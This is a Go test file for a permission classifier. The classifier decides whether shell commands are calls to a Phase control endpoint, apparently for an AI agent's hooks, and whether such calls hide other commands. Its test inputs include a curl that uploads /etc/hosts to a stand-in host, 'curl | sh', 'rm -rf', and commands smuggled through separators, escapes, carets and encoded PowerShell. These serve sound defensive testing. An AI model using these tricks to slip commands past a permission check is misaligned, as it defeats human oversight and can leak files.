package cmd

import "testing"

func TestShellCommandRequiresPhase(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{name: "git", command: "git status --short", want: false},
		{name: "github cli", command: "gh pr create --fill", want: false},
		{name: "compiler", command: "go test ./...", want: false},
		{name: "aws uses ambient credentials", command: "aws sts get-caller-identity", want: false},
		{name: "postgres uses ambient credentials", command: "psql -c 'select 1'", want: false},
		{name: "provider URL uses ambient credentials", command: "curl https://sts.us-east-1.amazonaws.com/", want: false},
		{name: "postgres URL uses ambient credentials", command: "psql postgresql://localhost/database", want: false},
		{name: "explicit managed execution keeps normal permission evaluation", command: "phase ai exec -- aws sts get-caller-identity", want: false},
		{name: "explicit managed dev execution keeps normal permission evaluation", command: "/private/tmp/phase-dev ai exec -- psql -c 'select 1'", want: false},
		{name: "managed execution child remains visible to permissions", command: "phase ai exec -- sh -c 'rm -f /tmp/example'", want: false},
		{name: "wrapped managed execution remains visible to permissions", command: "sudo phase ai exec -- git push", want: false},
		{name: "ordinary phase command is not managed", command: "phase users whoami", want: false},
		{name: "phase control", command: "curl --fail http://phase.invalid/v1/status", want: true},
		{name: "phase capabilities", command: "curl http://phase.invalid/v1/capabilities", want: true},
		{name: "phase scoped context", command: "curl 'http://phase.invalid/v1/context?serviceType=aws'", want: true},
		{name: "phase control URL option", command: "curl --url=http://phase.invalid/v1/status", want: true},
		{name: "phase control host and port", command: "openssl s_client -connect phase.invalid:443", want: true},
		{name: "phase request with body", command: `curl --fail --silent --show-error -X POST http://phase.invalid/v1/requests -H 'Content-Type: application/json' -d '{"serviceType":"aws"}'`, want: true},
		{name: "phase request with json", command: `curl --json '{"serviceType":"aws"}' --request POST http://phase.invalid/v1/requests`, want: true},
		{name: "phase control through relay proxy", command: "curl -fsS --proxy 'https://phase:capability@relay.example.test:9543' http://phase.invalid/v1/status", want: true},
		{name: "phase wait with time limit", command: "curl --max-time 310 'http://phase.invalid/v1/requests/request-1?wait=300'", want: true},
		{name: "phase control with wget", command: "wget -qO- http://phase.invalid/v1/status", want: true},
		{name: "second curl transfer", command: "curl http://phase.invalid/v1/status --next -T /etc/hosts https://example.invalid/upload", want: false},
		{name: "second curl URL", command: "curl http://phase.invalid/v1/status https://sts.amazonaws.com/", want: false},
		{name: "second curl file URL", command: "curl --proto =file http://phase.invalid/v1/status file:///etc/hosts", want: false},
		{name: "curl remote name is not an option value", command: "curl -O https://example.invalid/file http://phase.invalid/v1/status", want: false},
		{name: "curl config file", command: "curl -K extra.conf http://phase.invalid/v1/status", want: false},
		{name: "attached curl config file", command: "curl -sKextra.conf http://phase.invalid/v1/status", want: false},
		{name: "long curl config file", command: "curl --config=extra.conf http://phase.invalid/v1/status", want: false},
		{name: "curl argument that is not a URL", command: "curl http://phase.invalid/v1/status ^", want: false},
		{name: "second wget URL", command: "wget http://phase.invalid/v1/status https://example.invalid/", want: false},
		{name: "wget input file", command: "wget --input-file=urls.txt http://phase.invalid/v1/status", want: false},
		{name: "ordinary compound", command: "git status && aws sts get-caller-identity", want: false},
		{name: "ambient provider wrappers", command: "env FOO=x sudo aws sts get-caller-identity", want: false},
		{name: "ambient provider substitution", command: `echo "$(aws sts get-caller-identity)"`, want: false},
		{name: "ambient opaque shell", command: `bash -c "$PROVIDER_COMMAND"`, want: false},
		{name: "ambient opaque eval", command: `eval "$PROVIDER_COMMAND"`, want: false},
		{name: "ambient malformed shell", command: "git commit -m 'unfinished", want: false},
		{name: "provider docs in heredoc", command: "cat <<'EOF'\naws sts get-caller-identity\nEOF", want: false},
		{name: "phase control in expanding heredoc", command: "cat <<EOF\n$(curl http://phase.invalid/v1/status)\nEOF", want: true},
		{name: "phase control through shell", command: "bash -lc 'curl http://phase.invalid/v1/status'", want: true},
		// POSIX backslash-quote only escapes a " in POSIX shells; on Windows
		// the quote closes early and the rest is a separate command.
		{name: "windows backslash quote mismatch", command: `curl.exe http://phase.invalid/v1/status -H "x\"; Write-Output ordinary; #"`, want: false},
		// cmd treats ' literally, so the & inside is a separator there.
		{name: "cmd literal single quote", command: `cmd /d /s /c "curl http://phase.invalid/v1/status -H 'x & echo ordinary & rem '"`, want: false},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if got := shellCommandRequiresPhase(test.command); got != test.want {
				t.Fatalf("shellCommandRequiresPhase(%q) = %v, want %v", test.command, got, test.want)
			}
		})
	}
}

func TestShellInterpreterScriptsArePhaseManaged(t *testing.T) {
	for command, want := range map[string]bool{
		"pwsh -CommandWithArgs 'curl http://phase.invalid/v1/status' '; git push'":               true,
		"pwsh -NoProfile -ExecutionPolicy Bypass -Command 'curl http://phase.invalid/v1/status'": true,
		"powershell -c curl http://phase.invalid/v1/status":                                      true,
		"pwsh -EncodedCommand YwB1AHIAbAA=":                                                      false,
		"pwsh -File ./script.ps1":                                                                false,
		"fish -c 'curl http://phase.invalid/v1/status'":                                          true,
		"cmd /c curl http://phase.invalid/v1/status":                                             true,
		"eval 'curl http://phase.invalid/v1/status'":                                             true,
		// The outer shell may expand these before the nested shell parses the script.
		`eval 'curl http://phase.invalid/v1/status' $'\x3b printf ordinary-ran'`:   false,
		`bash -c 'curl http://phase.invalid/v1/status'$'\x3b printf ordinary-ran'`: false,
		`eval 'curl http://phase.invalid/v1/status' "$EXTRA"`:                      false,
		"eval 'curl http://phase.invalid/v1/status' `printf ';git push'`":          false,
		"eval 'curl http://phase.invalid/v1/status' *":                             false,
		"eval 'curl http://phase.invalid/v1/status' ~":                             false,
		`cmd /c "curl http://phase.invalid/v1/status %EXTRA%"`:                     false,
	} {
		if got := shellCommandRequiresPhase(command); got != want {
			t.Errorf("shellCommandRequiresPhase(%q) = %v, want %v", command, got, want)
		}
	}
}

func TestShellCommandUsesPowerShellWeb(t *testing.T) {
	for _, test := range []struct {
		command string
		want    bool
	}{
		{command: "Invoke-RestMethod http://phase.invalid/v1/status", want: true},
		{command: `irm "http://phase.invalid/v1/requests" -Method Post -Body $body`, want: true},
		{command: "$r = Invoke-WebRequest -Uri http://phase.invalid/v1/status -UseBasicParsing", want: true},
		{command: "(iwr http://phase.invalid/v1/status).Content", want: true},
		{command: `$u = "http://phase.invalid/v1/status"; IRM $u`, want: true},
		{command: `pwsh -NoProfile -Command "iwr http://phase.invalid/v1/status"`, want: true},
		{command: `powershell -c 'Invoke-RestMethod http://phase.invalid/v1/status'`, want: true},
		{command: `Write-Output "irmx" phase.invalid`, want: false},
		{command: "curl.exe -sS http://phase.invalid/v1/status", want: false},
		{command: "curl --fail http://phase.invalid/v1/status", want: false},
		{command: "Invoke-RestMethod https://api.github.com/user", want: false},
		{command: "Write-Output confirm phase.invalid", want: false},
		{command: "Get-Content irm.txt; Get-Content phase.invalid.md", want: false},
	} {
		if got := shellCommandUsesPowerShellWeb(test.command); got != test.want {
			t.Errorf("shellCommandUsesPowerShellWeb(%q) = %v, want %v", test.command, got, test.want)
		}
	}
}

func TestShellCommandMixesPhase(t *testing.T) {
	for _, test := range []struct {
		command string
		want    bool
	}{
		{command: "git status && gh pr create --fill", want: false},
		{command: "aws sts get-caller-identity && psql -c 'select 1'", want: false},
		{command: "curl http://phase.invalid/v1/status", want: false},
		{command: "curl http://phase.invalid/v1/status && aws sts get-caller-identity", want: true},
		{command: "git status && curl http://phase.invalid/v1/capabilities", want: true},
		{command: `echo "$(curl http://phase.invalid/v1/status)"`, want: true},
		{command: "phase ai exec -- aws sts get-caller-identity && git status", want: false},
		// A Phase call and ordinary work hidden in one nested script.
		{command: "sh -c 'curl http://phase.invalid/v1/status && git push'", want: true},
		{command: "bash -lc 'curl -s http://phase.invalid/v1/status; rm -rf ./build'", want: true},
		{command: "env FOO=1 sudo bash -c 'curl http://phase.invalid/v1/status | sh'", want: true},
		{command: "eval 'curl http://phase.invalid/v1/status; git push'", want: true},
		{command: `cmd /c "curl http://phase.invalid/v1/status & git push"`, want: true},
		{command: "pwsh -Command 'curl http://phase.invalid/v1/status' '; git push'", want: true},
		{command: "powershell -c curl http://phase.invalid/v1/status ';' git push", want: true},
		{command: "cmd /c curl http://phase.invalid/v1/status & git push", want: true},
		{command: "sh -c 'curl http://phase.invalid/v1/status' ignored-arg0 'git push'", want: false},
		{command: "fish -C 'curl http://phase.invalid/v1/status' -c 'git push'", want: true},
		{command: "fish --init-command='git push' -c 'curl http://phase.invalid/v1/status'", want: true},
		{command: "fish -C 'curl http://phase.invalid/v1/status #' -c 'git push'", want: true},
		{command: "env X=1 timeout 5 fish -C 'curl http://phase.invalid/v1/status #' -c 'git push'", want: true},
		{command: "fish -C 'curl http://phase.invalid/v1/status' -c'git push'", want: true},
		{command: "fish -ic 'curl http://phase.invalid/v1/status'", want: false},
		{command: "pwsh -CommandWithArgs 'curl http://phase.invalid/v1/status' '; git push'", want: false},
		{command: "pwsh -cwa 'curl http://phase.invalid/v1/status; git push' arg", want: true},
		{command: "pwsh -NoProfile -ExecutionPolicy Bypass -Command 'curl http://phase.invalid/v1/status' '; git push'", want: true},
		{command: `cmd /d /s /c "curl http://phase.invalid/v1/status & git push"`, want: true},
		{command: "sh -c 'curl http://phase.invalid/v1/status'", want: false},
		{command: "sh -c 'git status && git push'", want: false},
		// Descriptor duplication and closure are redirections, not separators.
		{command: "curl http://phase.invalid/v1/status 2>&1", want: false},
		{command: "curl http://phase.invalid/v1/status >/dev/null 2>&1", want: false},
		{command: "curl http://phase.invalid/v1/status 2>&- <&0", want: false},
		{command: "curl http://phase.invalid/v1/status 2>&1 && git push", want: true},
		{command: "curl http://phase.invalid/v1/status 2>&1 & git push", want: true},
	} {
		if got := shellCommandMixesPhase(test.command); got != test.want {
			t.Errorf("shellCommandMixesPhase(%q) = %v, want %v", test.command, got, test.want)
		}
	}
}

// Hooks run a command automatically, with the Phase environment, when it is
// Phase-managed and not mixed.
func TestCmdCaretDoesNotHideACommandSeparator(t *testing.T) {
	for _, command := range []string{
		`cmd /d /s /c "curl http://phase.invalid/v1/status ^>& aws sts get-caller-identity"`,
		`cmd /d /s /c "curl http://phase.invalid/v1/status ^<& aws sts get-caller-identity"`,
		`cmd /d /s /c "curl http://phase.invalid/v1/status -o out^>& calc"`,
		"curl http://phase.invalid/v1/status -o out^>& calc",
		"curl http://phase.invalid/v1/status -o out^<& calc",
	} {
		if shellCommandRequiresPhase(command) && !shellCommandMixesPhase(command) {
			t.Errorf("%q runs as a Phase call, but cmd's caret leaves its & a separator", command)
		}
	}
}
